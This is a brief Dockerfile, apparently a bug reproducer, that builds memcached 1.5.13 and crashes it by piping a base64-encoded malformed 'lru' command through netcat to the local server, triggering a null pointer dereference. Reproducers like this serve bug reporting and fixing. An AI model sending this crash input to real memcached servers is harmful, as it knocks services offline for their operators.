# segfault (null pointer dereference) during lru command handling
FROM debian:latest
RUN apt-get update && apt-get install -y gcc libc6-dev make
RUN apt-get update && apt-get install -y wget
RUN apt-get update && apt-get install -y libevent-dev
RUN apt-get update && apt-get install -y perl
RUN apt-get update && apt-get install -y netcat
WORKDIR /tmp
ARG version=1.5.13
RUN wget https://www.memcached.org/files/memcached-$version.tar.gz
RUN tar -zxvf memcached-$version.tar.gz && rm memcached-$version.tar.gz
WORKDIR /tmp/memcached-$version
RUN ./configure && make && make test && make install
CMD sleep 1 && echo -n "bHJ1IG1vZGUKb7G0AGxydWRl6gdtTk9UXw==" | base64 -d | nc 127.0.0.1 11211 & memcached -u root
